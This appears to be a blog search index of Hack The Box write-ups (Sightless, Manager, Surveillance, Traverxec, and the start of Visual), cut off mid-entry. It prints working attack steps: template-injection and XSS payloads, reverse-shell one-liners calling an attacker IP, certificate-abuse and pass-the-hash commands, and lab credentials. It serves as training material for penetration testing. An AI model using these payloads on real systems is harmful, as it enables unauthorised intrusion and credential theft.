fingerprint:OS:SCAN(V=7.94SVN%E=4%D=9/13%OT=21%CT=1%CU=31944%PV=Y%DS=2%DC=T%G=Y%TM=66E4OS:32C4%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53COS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)TOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DFOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40OS:%CD=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 256/tcp)HOP RTT      ADDRESS1   41.34 ms 10.10.14.12   41.43 ms 10.10.11.32OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 97.89 seconds\n\n\n\n\nPort\nService\n\n\n\n21\nFTP\n\n\n22\nSSH\n\n\n80\nHTTP\n\n\nHTTP PageHeading to the http page, we can find a SQLPad service.\nAdd sqlpad.sightless.htb to &#x2F;etc&#x2F;hosts and access the service.\nFootHoldSQLPAD Template Injection RCEAfter some googling, we can find this Template Injection RCE\nTo test RCE, let’s first create a new connection, and attempt to callback to our machine.Add a connection, select MySQL as the Driver, and add the following payload in the Database field.\n&#123;&#123; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;wget http://&lt;IP&gt;:1234/pwn&#x27;) &#125;&#125;\n\nNow start a http server on your machine\npython3 -m http.server 1234\n\nIf we now test the connection, we will get a callback on our machine, confirming RCE.\nReverse ShellTo get our first reverse shell, we just need to change the command to a reverse shell, I had problems using a normal reverse shell, so I had to encode it in base64 first.\nNow add a new connection, select MySQL as the Driver again, and add the following payload to the Database field.\n&#123;&#123; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo &quot;&lt;base64 revshell&gt;&quot; | base64 -d | bash&#x27;) &#125;&#125;\n\nAlso start a listener on your machine.\nnc -lvnp 1337\n\nIf we test the connection now, we pop a shell.\nMichael UserIf we notice, we have a shell as a root user, we are in a docker container.Since we are root, we can take a look at the &#x2F;etc&#x2F;shadow file, which has a hash for the michael user.\n\n$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh&#x2F;pL2IJD&#x2F;\n\nCrack the hash\nhashcat -m 1800 michael.hash /usr/share/wordlists/rockyou.txt\n\nWe now have a user and password\n\n\n\nUser\nPassword\n\n\n\nmichael\ninsaneclownposse\n\n\nWe can login through ssh with this password.\nssh michael@sightless.htb\n\nPrivEscFroxLor CVE-2024-34070Looking at the used ports in the machine, we can find the port 8080.\nnetstat -tnlp\n\nPort forward port 8080, in my case I used port 1234 since I use port 8080 for my Burp Suite proxy.\nssh -L 1234:127.0.0.1:8080 michael@sightless.htb\n\nVisiting the port forwarded page, we can see that it is being used for Froxlor.\nThis instance of froxlor is vulnerable to CVE-2024-34070.We can follow the steps here to abuse a stored xss vulnerability.This vulnerability allows an unauthenticated user to inject malicious scripts in the loginname parameter on the Login attempt, which will then be executed when viewed by the Administrator in the System Logs.\nSteps to reproduce:\nFirst step is to capture the login request.\nWe will need to change the loginname parameter to the payload present in the previous github link.\nOriginal Payload:\nadmin&#123;&#123;$emit.constructor`function+b()&#123;var+metaTag%3ddocument.querySelector(&#x27;meta[name%3d&quot;csrf-token&quot;]&#x27;)%3bvar+csrfToken%3dmetaTag.getAttribute(&#x27;content&#x27;)%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d&quot;https%3a//demo.froxlor.org/admin_admins.php&quot;%3bvar+params%3d&quot;new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d&quot;%2bcsrfToken%2b&quot;%26page%3dadmins%26action%3dadd%26send%3dsend&quot;%3bxhr.open(&quot;POST&quot;,url,true)%3bxhr.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;)%3balert(&quot;Your+Froxlor+Application+has+been+completely+Hacked&quot;)%3bxhr.send(params)&#125;%3ba%3db()`()&#125;&#125;\n\nURL Decode the payload and remove the “https://demo.froxlor.org“ from the url parameter.I also changed the username and password.\nPaste the edited payload in the loginname parameter, and URL encode it.\nWe can now login with the new created user.\nweb1 FTPLooking at the traffic tab, we can find the username called “web1”, associated with FTP traffic.\nWe can edit the user’s ftp account.Click on the web1 user, and then FTP &gt; Accounts.\nNow just change the user’s FTP password.\nWe can now access the ftp service.\nlftp web1@10.10.11.32\n\nIf we try to list the current directory, we get an error from certificate validation, we can disable this with the following command\nset ssl:verify-certificate false\n\nKeePass DatabaseWe can find a file called Database.kdb in the &#x2F;goaccess&#x2F;backup directory.\nThis is a KeePass Database file.We can try accessing it with kpcli.\nkpcli --kdb=Database.kdb\n\nIt requires a password to access.We can use keepass2john, to attempt to crack the password with john.\nkeepass2john Database.kdb &gt; keepass.hashjohn keepass.hash -w=/usr/share/wordlists/rockyou.txt --format=KeePass\n\nThere is an entry in the Database called ssh in &#x2F;General&#x2F;sighless.htb&#x2F;Backup.\nshow -f ssh\n\nThis entry has a password and a private ssh key as an attachment.Export the private key.\nattach ssh\n\nIf we attempt to login as root through ssh with this key, we get an error\nchmod 600 id_rsassh root@sightless.htb -i id_rsa\n\nJust use dos2unix and remove the extra space at the end to fix the formatting and use the key again.\ndos2unix id_rsa\n\nRooted :)\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Manager","url":"/HTB/Manager/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Windows\n    \n    \n      Difficulty:\n      Medium\n    \n    \n      Author:\n      Geiseric\n    \n    \n      Release Date:\n      October 21, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconnmap$ nmap -sC -sV 10.10.11.236Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 21:50 WESTNmap scan report for 10.10.11.236Host is up (0.059s latency).Not shown: 987 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus80/tcp   open  http          Microsoft IIS httpd 10.0|_http-title: Manager|_http-server-header: Microsoft-IIS/10.0| http-methods: |_  Potentially risky methods: TRACE88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-27 03:50:31Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.| ssl-cert: Subject: commonName=dc01.manager.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb| Not valid before: 2023-07-30T13:51:28|_Not valid after:  2024-07-29T13:51:28445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.| ssl-cert: Subject: commonName=dc01.manager.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb| Not valid before: 2023-07-30T13:51:28|_Not valid after:  2024-07-29T13:51:281433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-10-26T02:26:14|_Not valid after:  2053-10-26T02:26:14|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)|_ms-sql-info: ERROR: Script execution failed (use -d to debug)|_ssl-date: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.manager.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb| Not valid before: 2023-07-30T13:51:28|_Not valid after:  2024-07-29T13:51:28|_ssl-date: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.manager.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb| Not valid before: 2023-07-30T13:51:28|_Not valid after:  2024-07-29T13:51:28|_ssl-date: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: |   date: 2023-10-27T03:51:11|_  start_date: N/A| smb2-security-mode: |   311: |_    Message signing enabled and required|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n\nImportant services from the scan:    - 53&#x2F;tcp   DNS    - 80&#x2F;tcp   Microsoft IIS    - 1433&#x2F;tcp Microsoft SQL Server 2019    - 389&#x2F;tcp  Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\nAdd the domain to the &#x2F;etc&#x2F;hosts file\nHTTP PageI didn’t find anything useful on the webpage running on port 80\nGobusterGobuster found nothing useful either\n$ gobuster dir --url 10.10.11.236 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.11.236[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2023/10/26 21:53:30 Starting gobuster in directory enumeration mode===============================================================/images               (Status: 301) [Size: 150] [--&gt; http://10.10.11.236/images/]/Images               (Status: 301) [Size: 150] [--&gt; http://10.10.11.236/Images/]/css                  (Status: 301) [Size: 147] [--&gt; http://10.10.11.236/css/]   /js                   (Status: 301) [Size: 146] [--&gt; http://10.10.11.236/js/]    /IMAGES               (Status: 301) [Size: 150] [--&gt; http://10.10.11.236/IMAGES/]/CSS                  (Status: 301) [Size: 147] [--&gt; http://10.10.11.236/CSS/]   /JS                   (Status: 301) [Size: 146] [--&gt; http://10.10.11.236/JS/]                                                                                     ===============================================================2023/10/26 22:15:43 Finished===============================================================\n\n\nSMBsmbclient allowed access with an anonymous login, so I attempted to get more info through the service\nFootHoldCrackMapExec$ cme smb 10.10.11.236 -u anonymous -p &quot;&quot; --rid-brute \ncme found 7 users\nI added all the usernames to a .txt file and ran cme again with the newly obtained usernames to try and get a login\n$ cme smb 10.10.11.236 -u users.txt -p users.txt --no-brute \n\nWe get a valid loginUser: operatorPassword: operator\nSQLWith the obtained login, we can login into the SQL Server using Windows Authentication\n$ mssqlclient.py -port 1433 manager.htb/operator:operator@10.10.11.236 -windows-auth \n\nWe can use EXEC xp_dirtree to navigate the filesystemEnded up finding a website backup zip file in the website root folder (C:\\inetpub\\wwwroot)\nEXEC xp_dirtree &#x27;C:\\inetpub\\wwwroot&#x27;, 1, 1;\n\nSince it is in the root folder of the website, we can download it just by adding it to the link in our browser\nUser LoginAfter unzipping the file, these are the files we get\nIn the .old-conf.xml file we get the user raven password\nUser FlagWe can now evil-winrm into the machine and get the user.txt flag\n$ evil-winrm -i 10.10.11.236 -u raven -p &#x27;R4v3nBe5tD3veloP3r!123&#x27;\n\nPrivEscPrivileges&#x2F;CertificatesFirst I checked the current privileges:\nwhoami /priv\n\nI then ran GhostPack’s Certify.exe to check for vulnerable certificates\n*Evil-WinRM* PS C:\\Users\\Raven\\Desktop&gt; ./Certify.exe find /vulnerable   _____          _   _  __  / ____|        | | (_)/ _| | |     ___ _ __| |_ _| |_ _   _ | |    / _ \\ &#x27;__| __| |  _| | | | | |___|  __/ |  | |_| | | | |_| |  \\_____\\___|_|   \\__|_|_|  \\__, |                             __/ |                            |___./  v1.0.0[*] Action: Find certificate templates[*] Using the search base &#x27;CN=Configuration,DC=manager,DC=htb&#x27;[*] Listing info about the Enterprise CA &#x27;manager-DC01-CA&#x27;    Enterprise CA Name            : manager-DC01-CA    DNS Hostname                  : dc01.manager.htb    FullName                      : dc01.manager.htb\\manager-DC01-CA    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB    Cert Start Date               : 7/27/2023 3:21:05 AM    Cert End Date                 : 7/27/2122 3:31:04 AM    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb    UserSpecifiedSAN              : Disabled    CA Permissions                :      Owner: BUILTIN\\Administrators        S-1-5-32-544      Access Rights                                     Principal      Deny   ManageCA, Read                             MANAGER\\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544      Allow  ManageCA, ManageCertificates               MANAGER\\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512      Allow  ManageCA, ManageCertificates               MANAGER\\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519      Allow  ManageCA, Enroll                           MANAGER\\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116      Allow  Enroll                                     MANAGER\\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119    Enrollment Agent Restrictions : None[+] No Vulnerable Certificates Templates found!\n\nEven though it found no Vulnerable Certificates, we see that Raven has ManageCA permission.And with Manage CA permission, we can use this attack to escalate our privileges\nExploit“The technique relies on the fact that users with the Manage CA and Manage Certificates access right can issue failed certificate requests. The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.”\nSo first we add raven as an officer\n$ certipy ca -ca &#x27;manager-DC01-CA&#x27; -add-officer raven -username raven@manager.htb -password &#x27;R4v3nBe5tD3veloP3r!123&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Successfully added officer &#x27;Raven&#x27; on &#x27;manager-DC01-CA&#x27;\n\nThen we enable the SubCA template\n$ certipy ca -ca &#x27;manager-DC01-CA&#x27; -enable-template SubCA -username raven@manager.htb -password &#x27;R4v3nBe5tD3veloP3r!123&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Successfully enabled &#x27;SubCA&#x27; on &#x27;manager-DC01-CA&#x27;\n\nNow we can request a certificate based on the SubCA template, it will be denied but we will get the Request ID and the private key\n$ certipy req -username raven@manager.htb -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ca &#x27;manager-DC01-CA&#x27; -target 10.10.11.236 -template SubCA -upn administrator@manager.htbCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.[*] Request ID is 20Would you like to save the private key? (y/N) y[*] Saved private key to 20.key[-] Failed to request certificate\nThe Request ID is 20 in this caseSince we have the Manage CA and Manage Certificates privilege, we can now issue the failed certificate with the obtained ID\n$ certipy ca -ca &#x27;manager-DC01-CA&#x27; -issue-request 20 -username raven@manager.htb -password &#x27;R4v3nBe5tD3veloP3r!123&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Successfully issued certificate\n\nFinally we retrieve the certificate\n$ certipy req -username raven@manager.htb -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ca &#x27;manager-DC01-CA&#x27; -target 10.10.11.236 -retrieve 20Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Rerieving certificate with ID 20[*] Successfully retrieved certificate[*] Got certificate with UPN &#x27;administrator@manager.htb&#x27;[*] Certificate has no object SID[*] Loaded private key from &#x27;20.key&#x27;[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;\n\nTo finally be able to login as administrator, we can get the administrator hashes by using the obtained certificate and private key\n$ certipy auth -pfx &#x27;administrator.pfx&#x27; -username &#x27;administrator&#x27; -domain &#x27;manager.htb&#x27; -dc-ip 10.10.11.236Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@manager.htb[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@manager.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef\n\nWith the obtained hash, we can login as administrator\n$ psexec.py manager.htb/administrator@manager.htb -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -dc-ip 10.10.11.236Impacket v0.11.0 - Copyright 2023 Fortra[*] Requesting shares on manager.htb.....[*] Found writable share ADMIN$[*] Uploading file tSHvDKPA.exe[*] Opening SVCManager on manager.htb.....[*] Creating service Cuaw on manager.htb.....[*] Starting service Cuaw.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.4974](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\system\n\nRoot FlagAll we have left to do is get the root.txt flag\n","categories":["HTB"],"tags":["machine","medium"]},{"title":"[HTB] Surveillance","url":"/HTB/Surveillance/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Medium\n    \n    \n      Author:\n      TheCyberGeek & TRX\n    \n    \n      Release Date:\n      December 9, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconNmap$ nmap -sC -sV 10.10.11.245 -o nmap_scanStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-14 15:20 WETNmap scan report for 10.10.11.245Host is up (0.045s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nHTTP\n\n\nGobuster$ gobuster dir --url http://surveillance.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://surveillance.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/index                (Status: 200) [Size: 1]/images               (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/images/]/img                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/img/]/admin                (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/admin/login]/css                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/css/]/js                   (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/js/]/logout               (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/]/p1                   (Status: 200) [Size: 16230]/fonts                (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/fonts/]\n\nImportant directory: &#x2F;admin\n\nFootholdShell as www-dataSearching for Craft CMS exploit, I found CVE-2023-41892We can get a shell using this PoC\nThis PoC uses a proxy, we can just enable burp suite’s proxy and forward the request after running the exploit\nAfter I got the first shell I could not change directories, so I got a new revshell\n$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.13 1234 &gt;/tmp/f\n\nLateral Movement&#x2F;etc&#x2F;passwd\nSQL Backup fileIn the directory ~&#x2F;html&#x2F;craft&#x2F;storage&#x2F;backups, there is a sql backup zip file\nWe can just transfer the file to our machine\nFirst credentialsAfter unzipping the file and looking through it, if we search for admin, we get a hashed password for Matthew\nUsing crackstation we can get Matthew’s password\nuser.txt flagJust ssh as matthew with the obtained password and get the user.txt flag\nPrivEscLinPEASRunning LinPEAS on the machine, I found more ports being used\n\n\n\nPort\nService\n\n\n\n53\nDNS\n\n\n80\nCraftCMS Page\n\n\n22\nSSH\n\n\n3306\nSQL\n\n\n8080\nAnother Web Page?\n\n\nUsers with console:\nWe can also find a database configuration with a password\nLooking into the database.php file, we can also confirm the username\nPort ForwardingSince we had found another service running on port 8080, we can portforward this port to our machine through ssh\n$ ssh matthew@surveillance.htb -L 8080:localhost:8080\n\nZoneMinder LoginWe can see that it is a ZoneMinder login page\nWe can use the login we got before to look through the database\n$ mysql -h 127.0.0.1 -u zmuser -p\n\nIn the users table, we can find the user admin, and it’s hashed password\nWe can just update the password and login with our new provided password\nWe can now login in the ZoneMinder page and check the version it is running\nZoneMinder ShellWe can use this PoC to get a shell as zoneminder\nzmupdate.plThe user zoneminder can run every file that starts with ‘zm’ and has the .pl extension in the &#x2F;usr&#x2F;bin directory\nThere are a lot of possible files, but the one with the vulnerability is zmupdate.pl\nLooking at zmupdate.pl, which is one of the files we can run as sudo, it runs mysqldump, and then uses the $dbUser variable, we can use this to change the $dbUser variable to whatever command we want to run, and we will get an error for invalid user, but it will show us what was the user we were trying to use.For example, if we set $dbUser to “cat &#x2F;root&#x2F;root.txt” we can expect to get the root flag in the user field\n\nIf we try to just run the command without any argument, it will tell us that is is already in the latest version and will not run anything else.\nSo we will need to use the flags -v, -u and -p (version, user and password).\n$ sudo /usr/bin/zmupdate.pl -v 1 -u &#x27;$(cat /root/root.txt)&#x27; -p &#x27;$(id)&#x27;\n\n","categories":["HTB"],"tags":["machine","medium"]},{"title":"[HTB] Traverxec","url":"/HTB/Traverxec/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      jkr\n    \n    \n      Release Date:\n      November 16, 2019\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconNmap$ nmap -sC -sV 10.10.10.165 -o nmap_scanStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 16:08 WETNmap scan report for 10.10.10.165Host is up (0.058s latency).Not shown: 998 filtered tcp ports (no-response)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open  http    nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.04 seconds\n\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nHTTP Nostromo 1.9.6\n\n\nFootholdCVE-2019-16278After googling for nostromo 1.9.6 exploit, we can find CVE-2019-16278\nWe just need to setup a listener and run a revshell\n$ nc -lvnp 1234\n$ python CVE-2019-16278.py 10.10.10.165 80 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 1234 &gt;/tmp/f&quot;\n\n\nLateral Movement&#x2F;etc&#x2F;passwd\nWith this we know there is a user called David\nSSH backupRight now we cannot access David’s home folder, however by looking at the nostromo’s config files, there is a public_www folder in the user’s home folder that we have access to\n&#x2F;var&#x2F;nostromo&#x2F;conf&#x2F;nhttpd.conf\nAnd we can see that there is a backup for ssh id files\nWe can use netcat to transfer the file to our machine\nOn local machine:\n$ nc -lvp 1337 &gt; backup-ssh.tgz\n\nOn remote server:\n$ nc 10.10.14.9 1337 &lt; backup-ssh-identity-files.tgz\n\nWe now just need to extract it’s contents and we confirm that we have David’s ssh private key (id_rsa)\n$ tar -xvf backup-ssh.tgz\n\nIf we try logging in now, we will see that this key has a password\n$ chmod 400 id_rsa$ ssh -i id_rsa david@10.10.10.165\n\nTo decrypt the password, we can use ssh2john and then john to decrypt the password\n$ ss2john id_rsa &gt; hash.txt$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\nNow we know the id_rsa password, we can just ssh into the machine as David and get the user flag\nPrivEscsudo journalctlDavid has a bin directory in it’s home folder, and a bash script called “server-stats.sh” inside.\nIf we look into it’s contents we can see that it runs journalctl as root, and since David can run this file, we can use this to run a command as root\nIf we run this command, it will just print the output and nothing else happens, however, the -n5 flag means it will print only print 5 lines in the output.We can shrink our terminal to where we can only see less than 5 lines, and when we run the command, we will see that the binary “less” runs.And since this happens in the command that was ran as root (journalctl) we can run any command as root.\n$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service!/bin/bash\n\nNow we just get the root flag\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Visual","url":"/HTB/Visual/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Windows\n    \n    \n      Difficulty:\n      Medium\n    \n    \n      Author:\n      IsThisEnox\n    \n    \n      Release Date:\n      September 30, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconnmap$ nmap -sC -sV 10.10.11.234\n\nWebsite running on port 80, and we also know it is a Windows machine\nGobuster$ gobuster dir --url http://10.10.11.234/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\nWeb PageThe page running on port 80 appears to be running a service that compiles git projects when provided with a Git Repo link.\n\nAt the bottom of the page we can input a link for the Git Repo\nI attempted to download a reverse shell to the server by using a python http serverFirst start the http server in the directory of the php rev shell\n$ python3 -m http.server 8000\nThen try to request the file through the website\nIt tries to get a “service&#x3D;git-upload-pack”\nGitea Server SetupTo try and get a foothold, I setup a Gitea server on my machine so I can try and build an actual git project through the link\nMariaDBI used this 